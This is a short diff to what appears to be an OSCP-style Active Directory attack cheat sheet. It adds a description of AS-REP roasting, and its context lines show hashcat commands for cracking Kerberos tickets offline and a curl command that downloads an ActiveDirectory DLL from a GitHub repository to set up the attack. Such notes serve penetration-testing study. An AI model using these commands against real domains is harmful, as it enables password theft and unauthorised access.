@@ -1195,6 +1195,8 @@ hashcat -m 13100 -a 0 ticket.john wordlist.txt --show
 hashcat -m 13100 -a 0 ticket.john wordlist.txt --potfile-disable
 ```
 ## KERBEROASTING-ASREP
+AS-REPS roasting is a technique in which the password can be retrieved because the 'Do not require Kerberos preauthentication property' is enabled, or kerberos preauthentication is disabled. An attacker can skip the first step of authentication and request a TGT for this user, which can then be cracked offline.
+
 ##### KERBEROASTINGASREP - LOAD REQUIREMENTS
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
